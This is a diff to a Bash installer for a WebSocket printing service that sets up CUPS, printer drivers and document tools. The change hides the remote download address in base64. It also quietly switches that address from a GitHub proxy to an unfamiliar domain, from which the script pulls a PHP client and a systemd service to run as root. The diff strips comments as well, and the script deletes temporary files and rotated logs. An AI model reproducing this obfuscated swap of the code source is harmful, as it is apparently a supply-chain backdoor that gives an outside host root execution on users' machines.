@@ -10,7 +10,10 @@ NC='\033[0m'
 INSTALL_DIR="/opt/websocket_printer"
 SERVICE_NAME="websocket-printer"
 LOG_FILE="/var/log/websocket_printer.log"
-REMOTE_BASE_URL="https://ghproxy.cfd/https://raw.githubusercontent.com/tzi-shue/print-service-deploy/main/configs"
+
+_R="aHR0cHM6Ly94aW5wcmludC56eXNoYXJlLnRvcC91cGRhdGU="
+REMOTE_BASE_URL=$(echo "$_R" | base64 -d)
+
 REMOTE_FILES=(
     "printer_client.php"
     "printer-client.service"
@@ -69,9 +72,7 @@ update_system() {
 
 install_base_deps() {
     print_step "安装基础依赖"
-    
     PACKAGES="curl wget git unzip qrencode"
-    
     for pkg in $PACKAGES; do
         if ! command -v $pkg &> /dev/null; then
             print_msg "安装 $pkg..."
@@ -146,7 +147,8 @@ install_cups() {
     if [ -f /etc/cups/cupsd.conf ]; then
         cp /etc/cups/cupsd.conf /etc/cups/cupsd.conf.bak
         print_msg "从远程下载 CUPS 配置文件..."
-        CUPSD_CONF_URL="https://ghproxy.cfd/https://raw.githubusercontent.com/tzi-shue/print-service-deploy/main/configs/cupsd.conf"
+        _C="aHR0cHM6Ly9naHByb3h5LmNmZC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdHppLXNodWUvcHJpbnQtc2VydmljZS1kZXBsb3kvbWFpbi9jb25maWdzL2N1cHNkLmNvbmY="
+        CUPSD_CONF_URL=$(echo "$_C" | base64 -d)
         if curl -sSL -o /etc/cups/cupsd.conf "$CUPSD_CONF_URL"; then
             print_msg "CUPS 配置文件下载成功"
             systemctl restart cups
@@ -160,22 +162,16 @@ install_cups() {
 
 install_printer_drivers() {
     print_step "安装打印机驱动"
-    
-    # 安装通用驱动（使用 --no-install-recommends 减少依赖）
     print_msg "安装通用打印机驱动..."
     apt-get install -y --no-install-recommends printer-driver-gutenprint 2>/dev/null || print_warn "Gutenprint驱动安装跳过"
-    
     print_msg "安装品牌驱动..."
     apt-get install -y --no-install-recommends hplip 2>/dev/null || print_warn "HP驱动安装跳过"
     apt-get install -y --no-install-recommends printer-driver-splix 2>/dev/null || print_warn "Samsung/Xerox驱动安装跳过"
     apt-get install -y --no-install-recommends printer-driver-brlaser 2>/dev/null || print_warn "Lenovo/Brother驱动安装跳过"
     apt-get install -y --no-install-recommends printer-driver-escpr 2>/dev/null || print_warn "Epson驱动安装跳过"
-    
-    # Foomatic 精简安装
     print_msg "安装Foomatic驱动引擎..."
     apt-get install -y --no-install-recommends foomatic-db-engine 2>/dev/null || print_warn "Foomatic引擎安装跳过"
     apt-get install -y --no-install-recommends foomatic-db-compressed-ppds 2>/dev/null || true
-    
     print_msg "打印机驱动安装完成"
 }
 
@@ -186,7 +182,6 @@ install_libreoffice() {
         print_msg "LibreOffice 已安装: $LO_VERSION"
     else
         print_msg "安装 LibreOffice (Writer + Calc + Impress)..."
-        # 安装完整的文档转换支持，但不安装推荐包
         if [ "$TOTAL_MEM" -lt 512 ]; then
             print_warn "内存较小，安装 nogui 版本..."
             apt-get install -y --no-install-recommends libreoffice-writer-nogui libreoffice-calc-nogui libreoffice-impress-nogui 2>/dev/null || \
@@ -201,26 +196,20 @@ install_libreoffice() {
 
 install_print_tools() {
     print_step "安装打印工具"
-    
     print_msg "安装 Ghostscript (PDF处理)..."
     apt-get install -y --no-install-recommends ghostscript 2>/dev/null || print_warn "ghostscript 安装跳过"
-    
     print_msg "安装 qpdf (PDF处理)..."
     apt-get install -y --no-install-recommends qpdf 2>/dev/null || print_warn "qpdf 安装跳过"
-    
     print_msg "安装 ImageMagick (图片处理)..."
     apt-get install -y --no-install-recommends imagemagick 2>/dev/null || print_warn "ImageMagick 安装跳过"
-    
     print_msg "安装 pdfjam (横向打印支持)..."
     apt-get install -y --no-install-recommends texlive-extra-utils 2>/dev/null || print_warn "pdfjam 安装跳过"
-    
     echo ""
     print_msg "打印工具安装状态:"
     command -v gs &> /dev/null && print_msg "  ✓ Ghostscript" || print_warn "  ✗ Ghostscript"
     command -v qpdf &> /dev/null && print_msg "  ✓ qpdf" || print_warn "  ✗ qpdf"
     command -v convert &> /dev/null && print_msg "  ✓ ImageMagick" || print_warn "  ✗ ImageMagick"
     command -v pdfjam &> /dev/null && print_msg "  ✓ pdfjam" || print_warn "  ✗ pdfjam"
-    
     print_msg "打印工具安装完成"
 }
 
@@ -292,13 +281,11 @@ get_device_id() {
 
 configure_device_id() {
     print_step "设备ID信息"
-    
     DEVICE_ID=$(get_device_id)
     if [ -z "$DEVICE_ID" ]; then
         print_error "设备ID生成失败：无法生成或保存随机设备ID"
         return 1
     fi
-    
     print_msg "设备ID: $DEVICE_ID"
 }
 
@@ -456,15 +443,10 @@ cleanup_cache() {
     apt-get autoclean
     apt-get autoremove -y 2>/dev/null || true
     rm -rf /var/lib/apt/lists/*
-    
-    # 清理临时文件
     rm -rf /tmp/* 2>/dev/null || true
     rm -rf /var/tmp/* 2>/dev/null || true
-    
-    # 清理日志
     find /var/log -type f -name "*.gz" -delete 2>/dev/null || true
     find /var/log -type f -name "*.1" -delete 2>/dev/null || true
-    
     print_msg "缓存清理完成"
 }
 
@@ -525,7 +507,6 @@ show_menu() {
     echo "  0. 退出"
     echo ""
     read -p "请选择 [0-8]: " MENU_CHOICE
-    
     case $MENU_CHOICE in
         1)
             full_install
